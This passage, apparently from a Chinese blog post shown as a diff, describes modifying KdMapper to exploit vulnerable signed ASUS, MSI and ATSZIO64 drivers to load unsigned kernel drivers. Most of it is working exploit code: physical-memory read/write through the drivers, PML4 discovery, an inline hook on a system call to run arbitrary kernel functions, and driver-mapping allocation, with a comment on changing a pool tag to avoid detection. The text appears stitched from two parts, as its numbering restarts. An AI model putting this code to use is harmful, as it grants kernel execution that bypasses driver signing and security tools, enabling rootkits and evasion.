+        // Map physical memory section.
+        //
+        mappedSection = SuperMapMemory(DeviceHandle,
+                PhysicalAddress,
+                NumberOfBytes);
+        if (mappedSection) {
+                offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));
+                __try {
+                        if (DoWrite) {
+                                RtlCopyMemory(mappedSection/*RtlOffsetToPointer(mappedSection, offset)*/, Buffer, NumberOfBytes);
+                        }
+                        else {
+                                RtlCopyMemory(Buffer, mappedSection /*RtlOffsetToPointer(mappedSection, offset)*/, NumberOfBytes);
+                        }
+                        bResult = TRUE;
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                        bResult = FALSE;
+                        dwError = GetExceptionCode();
+                        Log(L"[!] Error AtszioReadWritePhysicalMemory Exception!" << std::endl);
+                }
+                //
+                // Unmap physical memory section.
+                //
+                SuperUnmapMemory(DeviceHandle,
+                        mappedSection);
+        }
+        else {
+                dwError = GetLastError();
+        }
+        SetLastError(dwError);
+        return bResult;
+}
+  其中SuperUnmapMemory和SuperMapMemory即为利用漏洞来读取物理内存的函数，具体不同的漏洞驱动有不同的实现。
+
+  上边的代码中读取物理内存的漏洞实现是驱动利用ZwMapViewOfSection映射\\Device\\PhysicalMemory来实现的，且在驱动里的映射减去了 SectionOffset，漏洞驱动的IDA逆向代码如下：
+
+__int64 __fastcall MapPhysicalMemory(__int64 pDeviceExtension, IRP *pIrp, _IO_STACK_LOCATION *pIosp)
+{
+    ......
+    RtlInitUnicodeString(v23, L"\\Device\\PhysicalMemory");
+    ObjectAttributes.ObjectName = v23;
+    ObjectAttributes.Length = 48;
+    ObjectAttributes.RootDirectory = 0i64;
+    ObjectAttributes.Attributes = 64;
+    ObjectAttributes.SecurityDescriptor = 0i64;
+    ObjectAttributes.SecurityQualityOfService = 0i64;
+    ZwOpenSection(&SectionHandle, 0xF001Fu, &ObjectAttributes);
+    if ( ObReferenceObjectByHandle(SectionHandle, 0xF001Fu, 0i64, 0, &Object, 0i64) >= 0 )
+    {
+        ......
+          v11 = ZwMapViewOfSection(
+                  SectionHandle,
+                  (HANDLE)0xFFFFFFFFFFFFFFFFi64,
+                  &BaseAddress,
+                  0i64,
+                  BusAddress.QuadPart,
+                  &SectionOffset,
+                  (PSIZE_T)&BusAddress.QuadPart,
+                  ViewShare,
+                  0,
+                  0x204u);
+        ......
+        BaseAddress = (char *)BaseAddress + TranslatedAddress.QuadPart - SectionOffset.QuadPart;  //这里地址减去了SectionOffset
+        LODWORD(pPhysicalMomoryInfo->MappedBaseAddress) = (_DWORD)BaseAddress;
+        v12 = LODWORD(pPhysicalMomoryInfo->MappedBaseAddress);
+        v13 = HIDWORD(BaseAddress);
+        HIDWORD(pPhysicalMomoryInfo->MappedBaseAddress) = HIDWORD(BaseAddress);
+     }
+    ......
+}
+  在上述代码的27行可以看出地址减去了 SectionOffset。
+
+  还有一种情况是驱动里的映射没有减去 SectionOffset，漏洞驱动的IDA逆向代码如下：
+
+NTSTATUS __fastcall MapPhysicalMemory(union _LARGE_INTEGER Offset, unsigned int nSize, PVOID *pAddressMapped, void **hSection)
+{
+  ULONG_PTR nSizeMapped; // rbx
+  NTSTATUS result; // eax
+  SIZE_T v9; // r15
+  NTSTATUS ntStatus; // eax
+  void *hSectionMapped; // rcx
+  NTSTATUS ntStatusReturn; // ebx
+  NTSTATUS ntStatusMap; // ebx
+  union _LARGE_INTEGER SectionOffset; // [rsp+58h] [rbp-39h] BYREF
+  ULONG_PTR ViewSize; // [rsp+60h] [rbp-31h] BYREF
+  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+68h] [rbp-29h] BYREF
+  struct _UNICODE_STRING DestinationString; // [rsp+98h] [rbp+7h] BYREF
+  PVOID Object; // [rsp+A8h] [rbp+17h] BYREF
+  PVOID BaseAddress; // [rsp+F8h] [rbp+67h] BYREF
+  nSizeMapped = nSize;
+  RtlInitUnicodeString(&DestinationString, L"\\Device\\PhysicalMemory");
+  ObjectAttributes.RootDirectory = 0i64;
+  ObjectAttributes.SecurityDescriptor = 0i64;
+  ObjectAttributes.SecurityQualityOfService = 0i64;
+  ObjectAttributes.ObjectName = &DestinationString;
+  ObjectAttributes.Length = 48;
+  ObjectAttributes.Attributes = 512;
+  result = ZwOpenSection(hSection, 7u, &ObjectAttributes);
+  BaseAddress = 0i64;
+  v9 = (unsigned int)nSizeMapped;
+  ViewSize = nSizeMapped;
+  SectionOffset = Offset;
+  if ( result >= 0 )
+  {
+    ntStatus = ObReferenceObjectByHandle(*hSection, 7u, 0i64, 0, &Object, 0i64);
+    hSectionMapped = *hSection;
+    ntStatusReturn = ntStatus;
+    if ( ntStatus >= 0 )
+    {
+      ntStatusMap = ZwMapViewOfSection(
+                      hSectionMapped,
+                      (HANDLE)0xFFFFFFFFFFFFFFFFi64,
+                      &BaseAddress,
+                      0i64,
+                      v9,
+                      &SectionOffset,
+                      &ViewSize,
+                      ViewShare,
+                      0,
+                      4u);
+      ZwClose(*hSection);
+      result = ntStatusMap;
+      *pAddressMapped = BaseAddress;
+      return result;
+    }
+    ZwClose(hSectionMapped);
+    result = ntStatusReturn;
+  }
+  *pAddressMapped = 0i64;
+  return result;
+}
+  可以看到返回的地址直接使用的ZwMapViewOfSection映射返回的地址，这种情况，我们的虚拟地址转物理地址的逻辑就要进行相应的修改。
+
+代码如下
+
+#ifndef RtlOffsetToPointer
+#define RtlOffsetToPointer(Base, Offset)  ((PCHAR)( ((PCHAR)(Base)) + ((ULONG_PTR)(Offset))  ))
+#endif
+BOOL WINAPI asus_driver::SuperReadWritePhysicalMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR PhysicalAddress,
+        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes,
+        _In_ BOOLEAN DoWrite)
+{
+        BOOL bResult = FALSE;
+        DWORD dwError = ERROR_SUCCESS;
+        PVOID mappedSection = NULL;
+        ULONG_PTR offset;
+        HANDLE sectionHandle = NULL;
+        //
+        // Map physical memory section.
+        //
+        mappedSection = SuperMapMemory(DeviceHandle,
+                PhysicalAddress,
+                NumberOfBytes,
+                &sectionHandle);
+        if (mappedSection) {
+                offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));
+                __try {
+                        if (DoWrite) {
+                                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
+                        }
+                        else {
+                                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
+                        }
+                        bResult = TRUE;
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                        bResult = FALSE;
+                        dwError = GetExceptionCode();
+                        Log(L"[!] Error AtszioReadWritePhysicalMemory Exception!" << std::endl);
+                }
+                //
+                // Unmap physical memory section.
+                //
+                SuperUnmapMemory(DeviceHandle,
+                        mappedSection,
+                        sectionHandle);
+        }
+        else {
+                dwError = GetLastError();
+        }
+        SetLastError(dwError);
+        return bResult;
+}
+ 
+
+3.使用MmMapIoSpace读写物理内存
+  有的漏洞驱动读写物理内存是用的MmMapIoSpace，则相应的实现逻辑需要变更，代码如下：
+
+BOOL WINAPI microstar_driver::SuperQueryPML4Value(
+        _In_ HANDLE DeviceHandle,
+        _Out_ ULONG_PTR* Value)
+{
+        PVOID pbLowStub1M = 0ULL, PML4 = 0;
+        DWORD cbRead = 0x100000;
+        PHYSICAL_ADDRESS address;
+        address.QuadPart = 0;
+        *Value = 0;
+        //pbLowStub1M = (ULONG_PTR)SuperMapMemory(DeviceHandle,
+        //      0ULL,
+        //       cbRead);
+        //原来是直接映射1M内存,但在Win10以上系统 MmMapIoSpace在读取到PTE地址时就会失败蓝屏，而在Win7上读取0x3000时失败
+        // 完整读取1M地址会失败，但不会蓝屏;
+        pbLowStub1M = malloc(0x1000);
+        do
+        {
+                RtlZeroMemory(pbLowStub1M, 0x1000);
+                if (address.QuadPart == 0x3000)
+                {
+                        //address.QuadPart += 0x1000;
+                }
+                if (SuperReadPhysicalMemory(DeviceHandle, address.QuadPart, pbLowStub1M, 0x1000))
+                {
+                        PML4 = (PVOID)SuperGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
+                        if (PML4)
+                        {
+                                *Value = (ULONG_PTR)PML4;
+                                //Log(L"[!] PML4 Value is 0x" << std::setbase(16) << PML4 << std::endl);
+                                break;
+                        }
+                }
+                else
+                {
+                        Log(L"[!] Error SuperReadPhysicalMemory Exception!" << std::endl);
+                }
+                address.QuadPart += 0x1000;
+        } while (address.QuadPart < cbRead);
+        SetLastError(ERROR_SUCCESS);
+        return (PML4 != 0);
+}
+ULONG_PTR microstar_driver::SuperGetPML4FromLowStub1M(
+        _In_ ULONG_PTR pbLowStub1M)
+{
+        ULONG offset = 0;
+        ULONG_PTR PML4 = 0;
+        ULONG cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) +
+                FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);
+        SetLastError(ERROR_EXCEPTION_IN_SERVICE);
+        __try {
+                /*while (offset < 0x100000) {
+                        offset += 0x1000;*/
+                if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(pbLowStub1M + offset))) //PROCESSOR_START_BLOCK->Jmp
+                        return NULL;
+                if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
+                        return NULL;
+                if (0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset))
+                        return NULL;
+                PML4 = *(UINT64*)(pbLowStub1M + offset + cr3_offset);
+                /* }*/
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+                Log(L"[!] Error SuperGetPML4FromLowStub1M Exception!" << std::endl);
+                return 0;
+        }
+        SetLastError(ERROR_SUCCESS);
+        return PML4;
+}
+  在漏洞利用驱动使用MmMapIoSapce时,由于虚拟地址转物理地址的逻辑实现，要遍历从0到0x100000的物理地址空间来进行虚拟地址的转换，在Win10以上的环境下，在这个过程中会读取到PTE地址所在的物理内存，从而引发BSOD，而在Win7上不引发BSOD，但经过测试，在读取0x3000的时候会失败。
+
+  所以在使用 MmMapIoSpace 的漏洞驱动时，只能在Win7环境下使用，且每次读取一个页面，即0x1000大小，同时跳过0x3000的地址。
+
+1.背景
+  KdMapper是一个利用intel的驱动漏洞可以无痕的加载未经签名的驱动，本人在利用其它漏洞（参考《【转载】利用签名驱动漏洞加载未签名驱动》）做相应的修改以实现类似功能。在这其中遇到了两个重要的问题，记录下来以作参考。
+
+ 
+
+2.CallKernelFunction问题及修改 
+ 
+
+2.1 相关核心代码
+template<typename T, typename ...A>
+	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) 
+{
+     ......   
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    ......
+    const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
+    ......
+    uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+    uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
+    *(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
+
+    static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom");
+    ......
+    if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
+        return false;
+    ......
+    if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
+        return false;
+    
+    if constexpr (!call_void)
+    {
+        using FunctionFn = T(__stdcall*)(A...);
+        const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
+        *out_result = Function(arguments...);
+    }
+    else 
+    {
+        using FunctionFn = void(__stdcall*)(A...);
+        const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
+        Function(arguments...);
+    }
+    // Restore the pointer/jmp
+    WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
+    return true;
+}
+   其原理就是InlineHook系统调用函数NtAddAtom，在NtAddAtom头部跳转至指定的函数，然后在用户层的ntdll中调用相应的系统调用NtAddAtom，之后就可以跳转至内核。
+
+ 
+
+2.2 调试查看
+  如图：
+
+
+
+  使用命令 ba e1 nt!NtAddAtom在函数下执行断点，然后运行KdMapper，断下后可以发现NtAddAtom的执行代码亦变成跳转到 ExAcquireResourceExclusiveLite，这是代码中执行相关函数的实现。
+
+ 
+
+2.3 其它相关执行函数
+  通过搜索可以看到CallKernelFunction的相关执行函数有几个，如下：
+
+
+
+  其中除了MmMapLockedPagesSpecifyCache以外，其它的函数参数个数都在四个及以下，MmMapLockedPagesSpecifyCache的执行成功可能是个巧合（后边会做相应的分析）。
+
+ 
+
+2.4 执行函数的逻辑
+  在2.1中可以看到内核中inline Hook了NtAddAtom，然后在用户层调用ntdll的NtAddAtom，然后就从用户层进入到内核。但在这个过程中的SSDT调用，系统将用户态的参数复制到内核中是根据SSPT指定的参数个数来复制的，每个系统的调用数据个数获取可以参考文章《WinDbg打印SSDT的参数个数脚本》，可以得出NtAddAtom的参数小于4个。使用IDA查看Win10 x64的NtAddAtom函数如下图，显示参数为3个。
+
+
+
+  至于为什么以4个参数为参考，是因为在x64环境下，函数传参数的前四个是用寄存器 rcx,rdx,r8,r9，多于四个才用内存栈。这样来说使用NtAddAtom作跳转只能传递四个参数，多的参数从用户空间到内核空间不会进行复制。
+
+ 
+
+2.5 实际在扩展中的遇到的问题
+  在扩展其它漏洞利用时使用了MmAllocatePagesForMdlEx函数，该函数原型如下：
+
+PMDL MmAllocatePagesForMdlEx(
+  [in] PHYSICAL_ADDRESS    LowAddress,
+  [in] PHYSICAL_ADDRESS    HighAddress,
+  [in] PHYSICAL_ADDRESS    SkipBytes,
+  [in] SIZE_T              TotalBytes,
+  [in] MEMORY_CACHING_TYPE CacheType,
+  [in] ULONG               Flags
+);
+  一共有六个参数，当时直接使用了后边两个参数传递的数据始终不正确，经过调试及分析才发现后两个参数并没有从用户空间传到内核空间。MmMapLockedPagesSpecifyCache的成功真的只是巧合，可能该函数最后两个参数不影响函数的成功。
+
+ 
+
+2.6 关于如何修改
+  更改的话只需要将NtAddAtom函数替换成一个参数比较多的native API，且在ntdll.dll中有相关调用的。根据《WinDbg打印SSDT的参数个数脚本》 ，用Windbg调试加IDA分析 ntdll.dll，确定可以使用NtNotifyChangeDirectoryFile，它在Win10下有9个参数。
+
+
+
+ 
+
+ 
+
+2.7 修改后代码
+template<typename T, typename ...A>
+	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) 
+{
+     ......   
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    ......
+    //NtAddAtom参数个数过少，使得用R3到R0时复制的数据少，四个之内使用rcx,rdx,r8和r9，多于四个使用内存栈，因此在使用NtAddAtom作为跳转函数时
+    //MmAllocatePagesForMdlEx(6个参数)和MmMapLockedPagesSpecifyCache(6个参数)	会导致后边的参数在进入内核时并未复制，因此而调用失败
+    //而NtNotifyChangeDirectoryFileEx有10个参数
+    //Win10 有NtNotifyChangeDirectoryFileEx而Win7没有，但Win7有NtNotifyChangeDirectoryFile(9个参数)
+    //const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
+    const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtNotifyChangeDirectoryFile"));
+    ......
+
+    static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtNotifyChangeDirectoryFile");
+    ......
+
+    return true;
+}
+ 
+
+3.MapDriver分配
+ 
+
+3.1 相关原始代码
+uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, 
+                             BYTE* data, 
+                             ULONG64 param1,
+                             ULONG64 param2,
+                             bool free, 
+                             bool destroyHeader,
+                             bool mdlMode, 
+                             bool PassAllocationAddressAsFirstParam,
+                             mapCallback callback, 
+                             NTSTATUS* exitCode) 
+{
+    ......
+    if (mdlMode) {
+		kernel_image_base = AllocMdlMemory(iqvw64e_device_handle, image_size, &mdlptr);
+	}
+	else {
+		kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
+	}
+    ......
+    if (!intel_driver::WriteMemory(iqvw64e_device_handle, realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size))
+    {
+		Log(L"[-] Failed to write local image to remote image" << std::endl);
+		kernel_image_base = realBase;
+		break;
+	}
+    ......
+    if (!asus_driver::CallKernelFunction(asus_device_handle, &status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
+        Log(L"[-] Failed to call driver entry" << std::endl);
+        kernel_image_base = realBase;
+        break;
+    }
+    ......
+}
+
+uint64_t kdmapper::AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr) {
+	/*added by psec*/
+	LARGE_INTEGER LowAddress, HighAddress;
+	LowAddress.QuadPart = 0;
+	HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;
+
+	uint64_t pages = (size / PAGE_SIZE) + 1;
+	auto mdl = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle, LowAddress, HighAddress, LowAddress, pages * (uint64_t)PAGE_SIZE);
+	if (!mdl) {
+		Log(L"[-] Can't allocate pages for mdl" << std::endl);
+		return { 0 };
+	}
+
+	uint32_t byteCount = 0;
+	if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
+		Log(L"[-] Can't read the _MDL : byteCount" << std::endl);
+		return { 0 };
+	}
+
+	if (byteCount < size) {
+		Log(L"[-] Couldn't allocate enough memory, cleaning up" << std::endl);
+		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
+		intel_driver::FreePool(iqvw64e_device_handle, mdl);
+		return { 0 };
+	}
+
+	auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
+	if (!mappingStartAddress) {
+		Log(L"[-] Can't set mdl pages cache, cleaning up." << std::endl);
+		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
+		intel_driver::FreePool(iqvw64e_device_handle, mdl);
+		return { 0 };
+	}
+
+	const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
+	if (!result) {
+		Log(L"[-] Can't change protection for mdl pages, cleaning up" << std::endl);
+		intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
+		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
+		intel_driver::FreePool(iqvw64e_device_handle, mdl);
+		return { 0 };
+	}
+	Log(L"[+] Allocated pages for mdl" << std::endl);
+
+	if (mdlPtr)
+		*mdlPtr = mdl;
+
+	return mappingStartAddress;
+}
+
+uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
+	if (!size)
+		return 0;
+
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
+
+	if (!kernel_ExAllocatePool) {
+		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
+		return 0;
+	}
+
+	uint64_t allocated_pool = 0;
+
+	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
+		return 0;
+
+	return allocated_pool;
+}
+  可以看到加载指定的驱动文件时根据是否是mdl加载来分配内存，调用的是AllocatePool或者AllocMdlMemory，而这两个函数分配的都是内存虚拟地址是连续的，但物理内存是不连续的，在有些情况下会导致问题。
+
+ 
+
+3.2 使用物理内存读写时导致的问题
+  3.1中指中原始的代码分配内存方式，在原kdmapper中未出现问题是因为Intel的漏洞利用是直接读写虚拟地址，例如复制内存代码如下：
+
+bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
+	if (!destination || !source || !size)
+		return 0;
+
+	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };
+
+	copy_memory_buffer.case_number = 0x33;
+	copy_memory_buffer.source = source;
+	copy_memory_buffer.destination = destination;
+	copy_memory_buffer.length = size;
+
+	DWORD bytes_returned = 0;
+	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
+}
+  因此不会出现问题，是因为直接操作内存。但在其它漏洞利用时，有时是利用物理内存，例如（参考《【转载】利用签名驱动漏洞加载未签名驱动》）ATSZIO64.sys中IDA反汇编的代码：
+
+// MapPhysicalMemory
+NTSTATUS __fastcall sub_140005B0C(union _LARGE_INTEGER Offset, unsigned int nSize, PVOID *pAddressMapped, void **hSection)
+{
+  ULONG_PTR nSizeMapped; // rbx
+  NTSTATUS result; // eax
+  SIZE_T v9; // r15
+  NTSTATUS ntStatus; // eax
+  void *hSectionMapped; // rcx
+  NTSTATUS ntStatusReturn; // ebx
+  NTSTATUS ntStatusMap; // ebx
+  union _LARGE_INTEGER SectionOffset; // [rsp+58h] [rbp-39h] BYREF
+  ULONG_PTR ViewSize; // [rsp+60h] [rbp-31h] BYREF
+  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+68h] [rbp-29h] BYREF
+  struct _UNICODE_STRING DestinationString; // [rsp+98h] [rbp+7h] BYREF
+  PVOID Object; // [rsp+A8h] [rbp+17h] BYREF
+  PVOID BaseAddress; // [rsp+F8h] [rbp+67h] BYREF
+
+  nSizeMapped = nSize;
+  RtlInitUnicodeString(&DestinationString, L"\\Device\\PhysicalMemory");
+  ObjectAttributes.RootDirectory = 0i64;
+  ObjectAttributes.SecurityDescriptor = 0i64;
+  ObjectAttributes.SecurityQualityOfService = 0i64;
+  ObjectAttributes.ObjectName = &DestinationString;
+  ObjectAttributes.Length = 48;
+  ObjectAttributes.Attributes = 512;
+  result = ZwOpenSection(hSection, 7u, &ObjectAttributes);
+  BaseAddress = 0i64;
+  v9 = (unsigned int)nSizeMapped;
+  ViewSize = nSizeMapped;
+  SectionOffset = Offset;
+  if ( result >= 0 )
+  {
+    ntStatus = ObReferenceObjectByHandle(*hSection, 7u, 0i64, 0, &Object, 0i64);
+    hSectionMapped = *hSection;
+    ntStatusReturn = ntStatus;
+    if ( ntStatus >= 0 )
+    {
+      ntStatusMap = ZwMapViewOfSection(
+                      hSectionMapped,
+                      (HANDLE)0xFFFFFFFFFFFFFFFFi64,
+                      &BaseAddress,
+                      0i64,
+                      v9,
+                      &SectionOffset,
+                      &ViewSize,
+                      ViewShare,
+                      0,
+                      4u);
+      ZwClose(*hSection);
+      result = ntStatusMap;
+      *pAddressMapped = BaseAddress;
+      return result;
+    }
+    ZwClose(hSectionMapped);
+    result = ntStatusReturn;
+  }
+  *pAddressMapped = 0i64;
+  return result;
+}
+  先把物理内存映射至用户空间，然后对内存进行操作，而这种情况下，读写内存就会出现问题，当操作内存大小大于一个页面时，就不能保证物理地址上的连续在对应的虚拟地址上也是连续的，如下图：
+
+
+
+  上图中展示连续的虚拟页面对应的物理页面不连续，同样，连续的物理页面对应的虚拟页面也不一定边结。
+
+  这样就导致一个问题，MapDriver在将驱动文件写入内存中WriteMemory时，使用的物理内存映射的地址，虽是连续的，但实际的虚拟页面可能就只写了第一个，其它的页面没有真正写入数据，这样在调用驱动文件入口函数CallKernelFunction时就会出现，导致BSOD。
+
+ 
+
+3.3解决方案
+  使用分配物理页面上连续的分配内存函数MmAllocatePagesForMdlEx和MmAllocateContiguousMemory。使用这些函数后，物理页面是连续的，映射后的虚拟页面也是连续的，同时和物理页面一一对应，这样就不会在写入读取数据时出现问题了。
+
+ 
+
+3.4 实现代码
+uint64_t asus_driver::MmAllocateContiguousMemory(HANDLE device_handle, SIZE_T NumberOfBytes)
+{
+        if (!NumberOfBytes)
+                return 0;
+
+        static uint64_t kernel_MmAllocateContiguousMemory = GetKernelModuleExport(device_handle, asus_driver::ntoskrnlAddr, "MmAllocateContiguousMemory");
+
+        if (!kernel_MmAllocateContiguousMemory) {
+                Log(L"[!] Failed to find MmAllocateContiguousMemory" << std::endl);
+                return 0;
+        }
+
+        uint64_t pAddress = 0;
+
+        if (!CallKernelFunction(device_handle, &pAddress, kernel_MmAllocateContiguousMemory, NumberOfBytes, MAXULONG64)) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
+                return 0;
+
+        return pAddress;
+}
+
+uint64_t asus_driver::MmAllocatePagesForMdlEx(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes, nt::MEMORY_CACHING_TYPE CacheType, nt::MEMORY_ALLOCATE_FLAG Flags)
+{
+        static uint64_t kernel_MmAllocatePagesForMdlEx = GetKernelModuleExport(device_handle, asus_driver::ntoskrnlAddr, "MmAllocatePagesForMdlEx");
+        if (!kernel_MmAllocatePagesForMdlEx)
+        {
+                Log(L"[!] Failed to find MmAllocatePagesForMdlEx" << std::endl);
+                return 0;
+        }
+
+        uint64_t allocated_pages = 0;
+
+        if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdlEx, LowAddress, HighAddress, SkipBytes, TotalBytes, CacheType, Flags))
+        {
+                Log(L"[!] Failed to CallKernelFunction MmAllocatePagesForMdlEx" << std::endl);
+                return 0;
+        }
+
+        return allocated_pages;
+}
+
+uint64_t kdmapper::AllocContiguousMdlMemory(HANDLE asus_device_handle, uint64_t size, uint64_t* mdlPtr) {
+        /*added by psec*/
+        LARGE_INTEGER LowAddress, HighAddress, SkipAddress;
+        LowAddress.QuadPart = 0;
+        HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;
+        SkipAddress.QuadPart = 0;
+        uint64_t pages = (size / PAGE_SIZE) + 1;
+        auto mdl = asus_driver::MmAllocatePagesForMdlEx(
+                asus_device_handle,
+                LowAddress,
+                HighAddress,
+                SkipAddress,
+                pages * (uint64_t)PAGE_SIZE,
+                nt::MEMORY_CACHING_TYPE::MmNonCached,
+                nt::MEMORY_ALLOCATE_FLAG::MM_ALLOCATE_REQUIRE_CONTIGUOUS_CHUNKS);
+        if (!mdl) {
+                Log(L"[-] Can't allocate pages for mdl" << std::endl);
+                return { 0 };
+        }
+
+        uint32_t byteCount = 0;
+        if (!asus_driver::ReadMemory(asus_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
+                Log(L"[-] Can't read the _MDL : byteCount" << std::endl);
+                return { 0 };
+        }
+
+        if (byteCount < size) {
+                Log(L"[-] Couldn't allocate enough memory, cleaning up" << std::endl);
+                asus_driver::MmFreePagesFromMdl(asus_device_handle, mdl);
+                asus_driver::FreePool(asus_device_handle, mdl);
+                return { 0 };
+        }
+
+        auto mappingStartAddress = asus_driver::MmMapLockedPagesSpecifyCache(asus_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
+        if (!mappingStartAddress) {
+                Log(L"[-] Can't set mdl pages cache, cleaning up." << std::endl);
+                asus_driver::MmFreePagesFromMdl(asus_device_handle, mdl);
+                asus_driver::FreePool(asus_device_handle, mdl);
+                return { 0 };
+        }
+
+        const auto result = asus_driver::MmProtectMdlSystemAddress(asus_device_handle, mdl, PAGE_EXECUTE_READWRITE);
+        if (!result) {
+                Log(L"[-] Can't change protection for mdl pages, cleaning up" << std::endl);
+                asus_driver::MmUnmapLockedPages(asus_device_handle, mappingStartAddress, mdl);
+                asus_driver::MmFreePagesFromMdl(asus_device_handle, mdl);
+                asus_driver::FreePool(asus_device_handle, mdl);
+                return { 0 };
+        }
+        Log(L"[+] Allocated pages for mdl" << std::endl);
+
+        if (mdlPtr)
+                *mdlPtr = mdl;
+
+        return mappingStartAddress;
+}
+
+uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, 
+                             BYTE* data, 
+                             ULONG64 param1,
+                             ULONG64 param2,
+                             bool free, 
+                             bool destroyHeader,
+                             bool mdlMode, 
+                             bool PassAllocationAddressAsFirstParam,
+                             mapCallback callback, 
+                             NTSTATUS* exitCode) 
+{
+    ......
+    if (mdlMode) {
+        //kernel_image_base = AllocMdlMemory(asus_device_handle, image_size, &mdlptr);
+        kernel_image_base = AllocContiguousMdlMemory(asus_device_handle, image_size, &mdlptr);
+    }
+	else {
+        //kernel_image_base = asus_driver::AllocatePool(asus_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
+        kernel_image_base = asus_driver::MmAllocateContiguousMemory(asus_device_handle, image_size);    
+    }
+    ......
+}
